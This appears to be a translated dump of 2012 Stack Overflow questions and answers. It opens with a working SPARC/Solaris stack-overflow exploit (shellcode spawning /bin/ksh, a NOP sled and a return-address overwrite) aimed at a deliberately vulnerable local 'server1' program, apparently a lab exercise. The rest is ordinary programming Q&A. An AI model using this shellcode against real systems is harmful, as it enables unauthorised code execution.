    *( ptr++ ) = ( ret >> 24 ) & 0xff;
    *( ptr++ ) = ( ret >> 16 ) & 0xff;
    *( ptr++ ) = ( ret >> 8 ) & 0xff;
    *( ptr++ ) = ( ret ) & 0xff;

    buf[ BUFSIZE ] = 0;

#ifndef QUIET
    printf("Return Address 0x%x\n",ret);
    printf("Start overflowing server program\n");
    printf("Then a program such as shell can be executed after server program is over\n");
#endif

    err = execl( "./server1", "server1", buf, ( void *)0 );
    if( err == -1 ) perror("execl");
} 
```

这是“灵活”的版本：

```
#include <stdlib.h>
#include <stdio.h>

/* lsd - Solaris shellcode 
 */
static char shell[]=         /* 10*4+8 bytes */

    "\x20\xbf\xff\xff"   /* bn,a  */
    "\x20\xbf\xff\xff"   /* bn,a  */
    "\x7f\xff\xff\xff"   /* call  */
    "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */
    "\x92\x02\x20\x10"   /* add %o0,16,%o1 */
    "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */
    "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */
    "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */
    "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */
    "\x91\xd0\x20\x08"   /* ta 8 */
    "/bin/ksh" ;

static int BUFSIZE;
static int OFFSET;

/* SPARC NOP
 */
static char np[] = "\xac\x15\xa1\x6e";

unsigned long get_sp( void ) {
    asm("or %sp,%sp,%i0");
}

main( int argc, char *argv[] ) {

BUFSIZE = atoi(argv[1]);
OFFSET = atoi(argv[2]);
char buf[ BUFSIZE ],*ptr;
unsigned long ret,sp;
int rem,i,err;

ret = sp = get_sp();

if( argv[1] ) {
        ret -= strtoul( argv[1], (void *)0, 16 );
}
/* align return address: IMPORTANT to be multiple of 8!! */

if( ( rem = ret % 8 ) ) {
        ret &= ~(rem);
}

bzero( buf, BUFSIZE );
for( i = 0; i < BUFSIZE; i+=4 ) {
        strcpy( &buf[i], np );
}

memcpy( (buf + BUFSIZE - strlen( shell ) - 8),shell,strlen( shell ));

ptr = &buf[OFFSET];

/* set fp to a save stack value
 */
*( ptr++ ) = ( sp >> 24 ) & 0xff;
*( ptr++ ) = ( sp >> 16 ) & 0xff;
*( ptr++ ) = ( sp >> 8 ) & 0xff;
*( ptr++ ) = ( sp ) & 0xff;

/* we now overwrite saved PC
 */
*( ptr++ ) = ( ret >> 24 ) & 0xff;
*( ptr++ ) = ( ret >> 16 ) & 0xff;
*( ptr++ ) = ( ret >> 8 ) & 0xff;
*( ptr++ ) = ( ret ) & 0xff;

buf[ BUFSIZE ] = 0;

#ifndef QUIET
    printf("Return Address 0x%x\n",ret);
    printf("Start overflowing server program\n");
    printf("Then a program such as shell can be executed after server program is over\n");
#endif

    err = execl( "./server1", "server1", buf, ( void *)0 );
    if( err == -1 ) perror("execl");
} 
```

请注意，唯一的区别是我声明 BUFSIZE 和 OFFSET 而不定义它们，然后将它们设置在 main 中。

对于后代，这是我正在攻击的“服务器”：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void copy1( const char *a ){
char buf[800];
    int i, j, k;
    printf("Inside COPY\n"); 
strcpy(buf,a);
}

void Doing_nothing() {
  int i, a[200];
  printf("Inside Doing_nothing\n");
  for (i=0; i < 100; i++)
     a[i] =2;
}

void main( int argc, char *argv[] ) {

    printf("\n *********************************\n");
    printf("This is a newly developed WEB server. \n");
    printf(" ****************************************\n") ;
    printf(" ******The web server is executing*******\n") ;
    printf(" ****************************************\n") ;
if (argc >=2 ) {
      Doing_nothing();
      copy1( argv[1] );
}      
} 
```

这些都是在我的 Oracle Solaris 10 9/10 s10s_u9wos_14a SPARC 机器上编译的。

我的问题是：

为什么灵活的程序不能工作只是因为我做了 BUFSIZE 和 OFFSET 命令行参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:24:05.643

我很惊讶动态代码竟然被编译了。

在堆栈上声明的数组，形式为`int A[X]`必须具有在编译时已知的大小。

您需要改为分配数组`malloc`。

```
char buf[ BUFSIZE ],*ptr; 
```

应该

```
char *buf,*ptr;
buf = (char *)malloc(BUFSIZE); 
```

完成后不要忘记释放它

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:25:03.053

答案很简单。C 不喜欢在定义数组时将变量作为大小说明符。一种方法是使用第一个示例中的 #define 或使用 const int 。如果要将大小指定为参数，则需要使用动态内存分配尝试：

```
char * buf = (char *) malloc(BUFSIZE * sizeof(char)); /* sizeof(char) is optional ideally */
...
...
/*when you are done*/

free(buf);
buf = NULL; 
```

希望这可以帮助

# c# - 从 ASP.net 代码背后更改 javascript src 属性

> ID：10403771
> 
> 赞同：3
> 
> 时间：2012-05-01T20:18:27.220
> 
> 标签：c#, javascript, asp.net, html

我正在尝试从文件隐藏代码中更改 JavaScript src。

```
<script type="text/javascript" runat="server" id="srcSurvey" language="JavaScript" src="mypage.asp?p=2"></script> 
```

当我尝试从文件后面的代码中访问对象属性时，没有可用的 src 选项，我是否需要将 src 文件放在其他属性中？

![在此处输入图像描述](../Images/46dec080d0bbbb5005dd866be5425eab.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T20:26:31.387

你不能访问这样的`src`属性。HTML 属性可通过`.Attributes`集合访问：

```
srcSurvey.Attributes["src"] = "my/directory/file.js"; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T20:34:32.553

**在 Head html 标记中从 ASP.net Code Behind 更改 javascript src**

```
// this is the name of the file, it could be any name, but because
// you need it dynamic I add the number at the end.
string jsFileName = string.Format("mypage.asp?p={0}", 1);

// we add a HtmlGenericControl with the tag script (this will work for a
// css also, you just need to change script for LINK, and src for href) 
HtmlGenericControl linkDynamicJavascriptFile = new HtmlGenericControl("script");
// and the you add the relative client url of the resource
linkDynamicJavascriptFile.Attributes.Add("src", 
    ResolveClientUrl("~/" + jsFileName));
// just adding the type attribute, not necesary in html5
linkDynamicJavascriptFile.Attributes.Add("type", "text/javascript");
// we add the script html generic control to the Page Header and we're done
Page.Header.Controls.Add(linkDynamicJavascriptFile); 
```

**上一个答案**

```
ScriptManager.RegisterClientScriptBlock(this, this.GetType(),
    "stackoverflow", 
    "<script type=\"text/javascript\" src=\"mypage.asp?p=2\"></script>", false); 
```

只需将包含脚本标记的硬编码字符串更改为动态字符串即可。

例如：

```
string code = string.Empty;
var pageNumber = PageRepository.GetPageAsString(); // get page number
code = string.Format("<script type=\"text/javascript\" src=\"mypage.asp?p={0}\"></script>", pageNumber);

ScriptManager.RegisterClientScriptBlock(this, this.GetType(),
"stackoverflow", code, false); 
```

# ios - 将选定的行复制到填充 Xcode 中另一个 UITableView 的数组

> ID：10403778
> 
> 赞同：1
> 
> 时间：2012-05-01T20:19:10.730
> 
> 标签：ios, xcode, uitableview, ios5, delegates

这是我的问题：我有两个要调用的 UITableViewController。OriginalTableViewController 和 SecondTableViewController。SecondTableViewController 由 NSMutableArray 和 UISegmentedControl 填充，用户可以在其中导航一堆数据并选择多行。

我想要做的是使用户能够选择多行，单击导航栏中的保存按钮，然后单击确定以关闭视图并返回必须由 SecondTableViewController 的选定行填充的 OriginalTableViewController。

自从我 4 个月前开始学习如何编码以来，我不知道该怎么做。我应该使用委托吗？还是别的什么？我将不胜感激任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-08T06:34:46.040

对于您的问题，委托将是最佳选择。您在 SecondTableViewController 中定义协议并在 OriginalTableViewController 中实现该协议。当按下 Save 按钮时，第二个表会通知原始表与选定的数据，原始表可以弹出/关闭第二个表并重新加载其表。

在 SecondTableViewController.h 中，定义协议：

```
@protocol SecondDelegate <NSObject>
@required
- (void) didSelectRows:(NSArray *)rows;
@end

@interface SecondTableViewController : UITableViewController
@property (retain) id<SecondDelegate> delegate;
@end 
```

在 OriginalTableViewController 中，实现协议：.h：

```
@interface OriginalTableViewController : UIViewController <UITableViewDelegate, UITableViewDataSource, SecondDelegate> 
```

米：

```
- (void) didSelectRows:(NSArray *)rows {
    // Update the model with selected data and reload. Also pops/dismisses second table.
} 
```

并在推送/呈现 SecondTableViewController 之前设置委托属性：

```
SecondTableViewController *second = nil; // instantiate the vc some how
second.delegate = self; 
```

在 SecondTableViewController.m 中，实现 save 方法：

```
- (void) save {
    NSMutableArray *array = [NSMutableArray array];
    for (NSIndexPath *indexPath in [self.tableView indexPathsForSelectedRows]) {
        // Populate array with selected objects.
    }
    [self.delegate didSelectRows:array];
} 
```

希望这可以帮助。

# oracle - 寻找使用 PL/SQL 解析结构化纯文本电子邮件消息的方法

> ID：10403781
> 
> 赞同：0
> 
> 时间：2012-05-01T20:19:33.830
> 
> 标签：oracle, plsql, oracle-apex

我的用户希望能够将纯文本电子邮件消息剪切并粘贴到 Application Express 中，并解析电子邮件的内容并将记录填充到表格中。电子邮件消息通常为 10,000 - 20,000 个字符，因此我可以将电子邮件放入 VARCHAR2 或 CLOB。

我要的是指导/伪代码/提示，以便在我填充 VARCHAR2 或 CLOB 后解析这些电子邮件。

消息具有以下格式：

```
Item One: content for item one

Item Two: 

multiline content for item two
more multiline content for item two

*********************************    <- these asterisks are in the text
Section Header I don't care about
*********************************

Item Three: content for item three 
```

等等。

项目标题是预先知道的，并且是固定的和定义的顺序。

我更喜欢通过 PL/SQL 来执行此操作，因为这将在 Oracle 托管的 Apex 实例中实现，但我相信 Java 也可以在那里使用（PL/SQL 更受欢迎）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T12:02:44.150

以下代码为您提供了如何使用 instr 和 substr 的示例。您还需要一种将这段代码放入循环并填充 l_header_first 和 l_header_next 的方法，这样您就可以获得所需的所有值。

```
declare
   l_email        varchar2(32767);
   l_first        pls_integer;
   l_next         pls_integer;
   l_text         varchar2(32767);
   l_header_first varchar2(100);
   l_header_next  varchar2(100);

begin
   l_email := 'Item One: content for item one

Item Two: 

multiline content for item two
more multiline content for item two

*********************************    <- these asterisks are in the text
Section Header I don''t care about
*********************************

Item Three: content for item three';

   l_header_first := 'Item One:';
   l_header_next  := 'Item Two:';
   l_first        := instr(l_email, l_header_first) + length(l_header_first) + 1;
   l_next         := instr(l_email, l_header_next);

   l_text := substr(l_email, l_first, l_next - l_first);
   dbms_output.put_line('Found ' || l_header_first);
   dbms_output.put_line(l_text);

   l_header_first := 'Item Two:';
   l_header_next  := 'Item Three:';
   l_first        := instr(l_email, l_header_first) + length(l_header_first) + 1;
   l_next         := instr(l_email, l_header_next);

   l_text := substr(l_email, l_first, l_next - l_first);
   dbms_output.put_line('Found ' || l_header_first);
   dbms_output.put_line(l_text);

end; 
```

# eclipse - scala sbt 缓存 x eclipse 构建路径

> ID：10403787
> 
> 赞同：2
> 
> 时间：2012-05-01T20:20:23.897
> 
> 标签：eclipse, scala, sbt

我在 build.sbt (casbah) 中添加了依赖项。我做了一个 sbt 更新，我确实检查了我的 ~/.ivy2/cache 目录，所有的 jar 都在那里。我是否必须将此 ~/.ivy/cache 目录添加到我的构建路径并将 casbah 作为外部 Jar 添加到我的项目中？如果没有，可能没有，因为我确实尝试过，我应该怎么做才能在我的 scala 项目中使用这个 jar？

**编辑**

我发现这个说明对我有帮助，但仍然是一个黑客

1.  在您的“.ivy2/cache”文件夹中建立一个名为“IvyCache”的简单项目（通用/项目），仅供参考。
2.  在您的“项目”文件夹中建立一个 Scala 项目。
3.  通过“将 JARs”添加到“Java Build Path”，将以下库添加到 Scala 项目中：

    3.a) 来自“/IvyCash/org.scala-tools.sbt”的所有 jars 由“*2.9.1-0.11.2”或任何其他 Scala/SBT 版本号过滤。

    3.b) 来自“/IvyCache/org.scala-tools.sbinary”的单个 sbinary_*.jar。

    3.c) 来自“/IvyCache/org.scala-tools.testing”的单个测试接口*.jar。

现在您的构建文件应该在 Eclipse 中编译。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:25:06.630

最简单的管理方法是使用[sbt 的 eclipse 插件](https://github.com/typesafehub/sbteclipse)。然后，您可以`sbt eclipse`在任何时候更改 build.sbt 中的依赖项时在命令行上说，Eclipse 文件将自动为您更新。

这样做意味着您将永远不必手动配置 Eclipse 构建路径。毕竟，sbt 已经知道如何构建构建路径，所以没有理由必须手动进行。

# firefox - 如何在 Firefox 12 HTML 5 视频中隐藏播放按钮

> ID：10403791
> 
> 赞同：3
> 
> 时间：2012-05-01T20:20:40.600
> 
> 标签：firefox, html5-video

当 Autoplay = false 时，Firefox 12 现在会向 HTML5 视频添加一个播放按钮。

[http://www.browsomatic.com/2012/01/firefox-12-now-shows-large-play-button.html](http://www.browsomatic.com/2012/01/firefox-12-now-shows-large-play-button.html)

有没有办法可以隐藏这个播放按钮。我想使用自己的播放按钮？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T23:54:07.147

哟，与此同时，您为什么不使用自己的播放按钮在其上放置图像？这样你就隐藏了。这有点骇人听闻，但它会起作用。

# javascript - Url.Action 没有给我实际的 Url

> ID：10403792
> 
> 赞同：3
> 
> 时间：2012-05-01T20:20:41.790
> 
> 标签：javascript, asp.net-mvc, asp.net-mvc-3

我有一个名为“索引”的视图。页面上有一个搜索栏，当您单击提交时，我有 Javascript 重定向：

```
var alerted='@url';
var url=alerted + "/" + $("#SearchText").val(); 
```

在 Razor 视图中，`url`变量定义为`var url = Url.Action("Index", "Search");`

但在 Javascript 中，警报输出“/”。我不知道为什么会这样。如果我将其更改为另一个控制器视图，那很好。但是如果我从索引中调用索引，它什么也没有给我。是什么赋予了？我需要它给我我所在页面的 url。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T20:27:55.157

您正在使用相对 URL。默认控制器的 Index 操作的相对 url 是“/”。尝试使用

```
Url.Action("Index", "Search", null, Request.Url.Scheme) 
```

如果您需要绝对 URL。

在您的 gloabal.asax 中，您可能有一个如下所示的路由方案：

```
routes.MapRoute(
                "Default", // Route name
                "{controller}/{action}/{id}", // URL with parameters
                new { controller = "Search", action = "Index", id = UrlParameter.Optional } // Parameter defaults
); 
```

如果未提供任何内容，则默认值是路由使用的控制器/操作。如果您从最后一个参数中删除了控制器和操作属性，那么索引和搜索将不再是您的默认操作和控制器。现在

```
@Url.Action("Index", "Search") 
```

将产生“/Search/Index”，因为“/”不再是有效的 URL。我实际上不建议这样做，但了解一下以了解正在发生的事情很有用。

如果**在**您添加的默认路线之前

```
routes.MapRoute(
                "Index", // Route name
                "Search/Index/{id}", // URL with parameters
                new { controller = "Search", action = "Index", id = UrlParameter.Optional } // Parameter defaults); 
```

那么来自的所有调用`Url.Action("Search","Index")`都会在 URL 中产生“/Search/Index”，因为它们会首先点击此路由。但是，如果直接在浏览器中输入，则不输入任何操作或控制器仍会正确地将您带到您的索引页面。

# vba - 字符串的 VBA 范围

> ID：10403794
> 
> 赞同：16
> 
> 时间：2012-05-01T20:20:44.010
> 
> 标签：vba, excel

这有点愚蠢，但我在这个简单的陈述中被困了一段时间：

```
 Dim range1 as Range
    Dim mysheet as String
    Dim myrange as String

    mysheet = "Sheet1"
    range = "A1:A10"

range1 = Worksheets(mysheet).Range(myrange) 
```

我已经测试了我在互联网上找到的所有解决方案，例如[this](http://msdn.microsoft.com/en-us/library/aa139976%28v=office.10%29.aspx)、[this](https://stackoverflow.com/questions/2911577/how-to-convert-a-string-to-a-range-object)和[this](http://anthony-vba.kefra.com/forum/viewtopic.php?t=1917&sid=efca1b5454c7f98554a3ed908b7b3bda)，但没有。

它一直给我错误：1004“应用程序定义的错误”或“对象变量或未设置”。

我尝试了以下方法：

```
range1 = ThisWorkbook.Worksheets(mysheet).Range(myrange)

range1 = ActiveWorkbook.Worksheets(mysheet).Range(myrange)

range1 = Sheets(mysheet).Range(myrange) (and the combinations above)

range1 = Worksheets(mysheet).Range(Cells(1,1), Cells(1,10)) (and the combinations with This/Active workbook) 
```

和

```
with This/ActiveWorkbook
range1 = .Worksheets(mysheet).Range(myrange)
end with 
```

没有一个工作。

这是一件非常愚蠢的事情，但我已经被困了一段时间了：s

谁能帮我？

真的提前谢谢了。

最好的祝福，

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-01T20:25:45.013

您需要使用 Set 来分配对象：

```
Set range1 = Worksheets(mysheet).Range(myrange) 
```

# javascript - javascript排序数组双重排序

> ID：10403797
> 
> 赞同：6
> 
> 时间：2012-05-01T20:21:04.047
> 
> 标签：javascript

我有一个对象数组`MyArrayOfItems`，`Item`其对象如下所示：

```
Item
{
  ContainerID: i, // int
  ContainerName: 'SomeName', // string
  ItemID: j, // int
  ItemName: 'SomeOtherName' // string
} 
```

我想对这个数组进行排序，以便它按`ContainerID`字母`ItemName`顺序排序。

我有一个自定义排序功能，到目前为止看起来像这样：

```
function CustomSort(a, b) {

  Item1 = a['ContainerID'];
  Item2 = b['ContainerID'];

  return Item1 - Item2;
}

MyArrayOfItems.sort(CustomSort); 
```

这按 ContainerID 排序，但我如何按 ItemName 排序？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T20:25:45.047

使用[String.localeCompare](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/localeCompare)函数。`ContainerID`当和相等时使用它`a`。`b`

```
function CustomSort(a, b) {
  var Item1 = a['ContainerID'];
  var Item2 = b['ContainerID'];
  if(Item1 != Item2){
      return (Item1 - Item2);
  }
  else{
      return (a.ItemName.localeCompare(b.ItemName));
  }
} 
```

要调整排序顺序，您始终可以放在任何表达式`-`的前面。`return`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-01T20:28:06.680

```
function CustomSort(a, b) {

  Item1 = a['ContainerID'];
  Item2 = b['ContainerID'];
  if(Item1 - Item2 !=0){
      return Item1 - Item2;
  }
  else{
      if (a.ItemName < b.ItemName)
         return -1;
      if (a.ItemName > b.ItemName)
         return 1;
      return 0;
  }
} 
```

# c# - 在数据库中插入文本框值

> ID：10403798
> 
> 赞同：2
> 
> 时间：2012-05-01T20:21:17.813
> 
> 标签：c#, sql, ado.net

我使用以下代码将 TextBox 值保存到数据库中。但是，当我插入该值时，它将保存在新行中。如何将其保存到同一行？

```
private void button1_Click(object sender, EventArgs e)
{
    string pass = textBox1.Text;
    sql = new SqlConnection(@"Data Source=PC-PC\PC;Initial Catalog=P3;Integrated Security=True");
    SqlCommand cmd = new SqlCommand();
    cmd.Connection = sql;
    cmd.CommandText = ("Insert [MyTable] ([MyColumn]) Values (@pass)");
    cmd.Parameters.AddWithValue("@pass", pass);
    sql.Open();
    cmd.ExecuteNonQuery();
    sql.Close();
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:23:15.050

使用更新命令而不是插入。

```
cmd.CommandText = "update YourTable set FieldName = YourValue where KeyField = YourKeyValue" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:36:59.913

您需要使用 UPDATE 而不是 INSERT，类似于：

```
UPDATE yourTable
SET yourColumn = newValue
WHERE (your criteria needs to go here) ID = recordId 
```

您需要为您的记录创建 UPDATE 语句。如果您打算全部更新，那么您的声明将是：

```
UPDATE yourTable
SET yourColumn = newValue 
```

否则，您将需要告诉它要更新哪些记录

```
UPDATE yourTable
SET yourColumn = newValue
WHERE ID = yourID

private void button1_Click(object sender, EventArgs e)
{
    string pass = textBox1.Text;
    sql = new SqlConnection(@"Data Source=PC-PC\PC;Initial Catalog=P3;Integrated Security=True");
    SqlCommand cmd = new SqlCommand();
    cmd.Connection = sql;
    cmd.CommandText = "UPDATE MyTable SET MyColumn = @pass WHERE id=@id"
    cmd.Parameters.AddWithValue("@pass", pass);
    cmd.Parameters.AddWithValue("@id", 1);
    sql.Open();
    cmd.ExecuteNonQuery();
    sql.Close();
} 
```

这是一个网站，其中包含一些解释使用 ADO.NET 的示例：

[使用 C# 进行简单的 ADO.NET 数据库读取、插入、更新和删除](http://www.codeproject.com/Articles/1155/Simple-ADO-NET-Database-Read-Insert-Update-and-Del)

[如何在 ado net 中使用 UPDATE](https://stackoverflow.com/questions/5772219/how-to-use-update-in-ado-net)

# actionscript-3 - 动作脚本 - 打印

> ID：10403802
> 
> 赞同：0
> 
> 时间：2012-05-01T20:21:28.017
> 
> 标签：actionscript-3, flash

您可以编写动作脚本来进行闪存打印。
有没有办法打印定义 iframe 中的内容并打印？
示例：
这是一个很好的闪存打印演示脚本。

```
print_btn.addEventListener(MouseEvent.CLICK,printContent);

function printContent(evt:MouseEvent) {
    var printJob:PrintJob = new PrintJob();

    if (printJob.start()) {

        if (content_mc.width>printJob.pageWidth) {
            content_mc.width=printJob.pageWidth;
            content_mc.scaleY=content_mc.scaleX;
        }

        printJob.addPage(content_mc);
        printJob.send();
    }
} 
```

content_mc 在 .fla 文件中定义。我希望动作脚本查看当前网页并在 iframe 中打印内容。这可以做到吗？示例将很有帮助，因为我只是在学习动作脚本。感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T01:44:51.407

直接没有。有几个“黑客”是的。因此，您可以在 Flex 中使用 ExternalInterface 与 javascript 进行通信。这是必要的，因为您不能像浏览器在 Flex 中那样直接渲染 IFrame（除了 AIR，即使在所有场景中它都不会是 1:1 匹配）。第二步是在 javascript 函数中调用 window.print()。你的 AS 看起来像这样：

ExternalInterface.call("doJSPrint");

所涉及的最后一个“hack”是将css中的媒体设置为在HTML页面中的其他元素上适当地打印/屏幕，以便让IFrame打印。

相关链接：

[http://www.w3.org/TR/CSS2/media.html](http://www.w3.org/TR/CSS2/media.html)

[http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html)

[http://www.spikything.com/blog/index.php/2009/08/23/externalinterface_howto/](http://www.spikything.com/blog/index.php/2009/08/23/externalinterface_howto/)

祝你好运，如果您认为我可以提供更多信息，请告诉我。

# jquery - 当我每 15 分钟将 slotMinutes 放入 fullCalendar 时，如何显示所有小时？

> ID：10403803
> 
> 赞同：1
> 
> 时间：2012-05-01T20:21:39.983
> 
> 标签：jquery, fullcalendar

我有一个完整的日历，我将 slotMinutes 设置为 15 分钟，但在日历的时间里只显示 7am ... 9am（它应该显示 7:15am、7:30am...）。但是对于 slotMinutes:20 或 slotMinutes:05，它工作正常。

我的代码：

```
calendar = $('#resultCalender').fullCalendar({
                        theme: false,
                        slotMinutes: 15,
                        events: result.CalendarDtos,
                        header: {
                            left: 'prev,next today',
                            center: 'title',
                            right: 'month,agendaWeek,agendaDay'
                        },
                        selectable: true,
                        selectHelper: true,
                        firstDay: 1 
```

... }

slotMinutes 日历中的小时数：15，应该显示 7am, 7:15am, 7:30am... 但它只显示 7am, 8am, 9am.... 如果我设置 slotMinutes: 10，它工作正常，它显示早上 7 点、早上 7 点 10 分、早上 7 点 20 分……）

任何想法？

# mysql - 连接到不同服务器上的数据库

> ID：10403804
> 
> 赞同：-1
> 
> 时间：2012-05-01T20:21:42.403
> 
> 标签：mysql, database, connect

这是我的情况：我有一个文件 homepage.php，我想让我的客户托管在他们的服务器上。homepage.php 需要以某种方式从我的数据库中获取信息，但我不希望我的客户完全访问我的数据库。最好的方法是什么？我怎样才能让它发挥作用？

我试图通过包含以下行来做到这一点：

```
require( "http://www.mydomain.com/connect.php" ); 
```

在 homepage.php 但我不确定这是否是正确的方法，而且它给了我一个错误。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:24:45.733

它给你什么错误？这也行不通，因为您的服务器会解析 PHP 并将结果发回，而不是像您想要的那样包含源代码。

### 简单的解决方案

拥有一个只读帐户，并将这些详细信息提供给客户的页面。

然后他们可以用你的 mysql 服务器的 IP/暴露端口建立 mysql 连接并从那里登录。

### 更好的解决方案

每个客户都有帐户，因此权限可以相应变化，否则与上述相同。

### 最佳解决方案

通过 SOAP 服务公开访问。如果您有足够多的客户并且他们正在与您一起开发，那么 API 是无价的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:48:36.110

如果没有警告，就很难解决连接问题，尽管我敢打赌它可能与查看 localhost 与数据库所在机器的 IP 有关。

最好的解决方案是为每个客户创建一个包含用户名和密码的 ini 文件，并让 connect.php 文件在该客户的本地网络服务器上查找 ini 文件。然后，您可以将每个帐户的权限配置为仅对某些表具有选择访问权限，或更新某些用户的权限等。

此外，如果您的客户将围绕您的代码构建自己的代码，那么开发 SOAP 服务可能会很有用。

# c# - 配置虚拟打印机端口重定向

> ID：10403805
> 
> 赞同：1
> 
> 时间：2012-05-01T20:21:42.757
> 
> 标签：c#, port, printer-properties, virtual-printer

我需要配置一个虚拟打印机端口以通过 c# 代码将其重定向到外部程序（.exe 文件）。现在我可以安装一个带有一些自定义的虚拟端口（感谢[bghh](http://social.msdn.microsoft.com/Forums/en-US/netfxbcl/thread/a901406f-7a38-43a2-a970-dab9d52cb0f3/)代码）。附图说明了要求。任何帮助将不胜感激。

![手动配置虚拟打印机端口重定向](../Images/ae00bc8b45530eb87f5467c702b86cf6.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-02T20:22:32.220

我找到了解决上述问题的方法。系统上注册的所有打印机端口都列在注册表项“ *SYSTEM\ControlSet001\Control\Print\Monitors\Redirected Port\Ports* ”下

可以编辑这些键下的值以获得所需的结果。下面是使用 c# 编辑它的代码。

```
bool found = false;
string portName = "testing:";
RegistryKey PrinterPort = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\Print\\Monitors\\Redirected Port\\Ports", true);
foreach (string pp in PrinterPort.GetSubKeyNames())
{
    if (pp == portName)
    {
        PrinterPort = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\Print\\Monitors\\Redirected Port\\Ports"+"\\"+portName, true);
        found = true; break;
    }
}
if (found)
{
    PrinterPort.SetValue(@"Arguments", "@C:\\gs\\pdfwrite.txt -sOutputFile=\"d:\\hello.pdf\" -c .setpdfwrite -f -");
    PrinterPort.SetValue(@"Command", "c:\\gs\\bin\\gswin32c.exe");
    PrinterPort.SetValue(@"Delay", 0x12c);
    PrinterPort.SetValue(@"LogFileDebug", 0x0);
    PrinterPort.SetValue(@"LogFileName", "");
    PrinterPort.SetValue(@"LogFileUse", 0x0);
    PrinterPort.SetValue(@"Output", 0x0);
    PrinterPort.SetValue(@"Printer", "Send To Cool Printer");
    PrinterPort.SetValue(@"PrintError", 0x0);
    PrinterPort.SetValue(@"RunUser", 0x0);
    PrinterPort.SetValue(@"ShowWindow", 0x0);
}
PrinterPort.Close(); 
```

# wcf - WCF SOAP 1.2 服务需要 SOAP 1.1 内容类型

> ID：10403806
> 
> 赞同：21
> 
> 时间：2012-05-01T20:21:52.647
> 
> 标签：wcf

我正在构建一个需要与非 WCF 客户端互操作的 WCF Web 服务（事实上，不会有 WCF 客户端）。

我已经使用 SOAP 1.2 编写了一个 WSDL（[根据这个例子](http://schemas.xmlsoap.org/wsdl/soap12/soap12WSDL.htm)）。我已经验证了 WSDL 并使用了这个文件（不是 WCF 生成的 WSDL，表面上有所不同）来创建一个[soapUI](http://www.soapui.org/)测试项目。

我的要求是 Web 服务将支持 SOAP 1.2，所以我不能只是退回到 SOAP 1.1（它在早期原型中工作得很好）。

我使用[WSCF.blue](http://wscfblue.codeplex.com/)来生成我的 WCF 服务、接口和数据协定类。如果我在浏览器中点击 WCF 服务，一切都编译得很好，并且端点会暴露出来。世界上一切似乎都很好。

当我尝试从 soapUi 调用方法时，我从服务器得到以下响应（从 soapUI 可见）：

```
HTTP/1.1 415 Cannot process the message because the content type 
'application/soap+xml;charset=UTF-8;action="http://tempuri.org/FetchMyThing"' 
was not the expected type 'text/xml; charset=utf-8'.
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 30 Apr 2012 08:15:29 GMT
Content-Length: 0 
```

（为了这个问题，实际的方法名称和命名空间已手动更改。命名空间中的任何拼写错误都不是我的代码中的错误——只是输入这个问题时的疏忽）

我知道 SOAP 1.1 指定内容类型必须是**text/xml**。SOAP 1.2 需要**application/soap+xml**。

我的原始请求（根据soapUI）：

```
POST http://localhost/MyWs.svc HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/FetchMyThing"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:ns="http://tempuri.org">
   <soap:Header/>
   <soap:Body>
      <ns:fetchMyThingRequest attribute1="1" attribute2="10">
      </ns:fetchMyThingRequest>
   </soap:Body>
</soap:Envelope> 
```

从这个响应中，它告诉我我的请求格式正确——它是一个内容类型正确的 SOAP 1.2 请求。然而，我的 WCF 服务并不期望这种内容类型，我认为这意味着我没有正确配置它，它仍然认为它是一个 SOAP 1.1 Web 服务。

最小的 Web.config，根据[这篇博文](http://blog.allanglen.com/2010/05/implementing-a-minimal-soap-1-2-binding-in-wcf)：

```
<system.serviceModel>
  <services>
    <service name="MyNamespace.MyPort">
      <endpoint address="" binding="customBinding" bindingConfiguration="httpSoap12" contract="IWsPort12" />
    </service>
  </services>

  <bindings>
    <customBinding>
      <binding name="httpSoap12">
        <textMessageEncoding messageVersion="Soap12" />
        <httpTransport />
      </binding>
    </customBinding>
  </bindings>
</system.serviceModel> 
```

服务合同的片段：

```
[ServiceContract(Namespace = "http://tempuri.org")]
public interface IWsPort
{
  [OperationContract(Action = "http://tempuri.org/FetchMyThing")]
  [FaultContract(typeof(WsFault), Action = "http://tempuri.org/FetchMyThing", Name = "fetchMyThingFault")]
  [XmlSerializerFormat(SupportFaults = true)]
  FetchMyThingResponse FetchMyThing(FetchMyThingRequest request);
} 
```

我为我的 WCF 服务启用了服务跟踪，并看到以下异常似乎证实了我的假设：

```
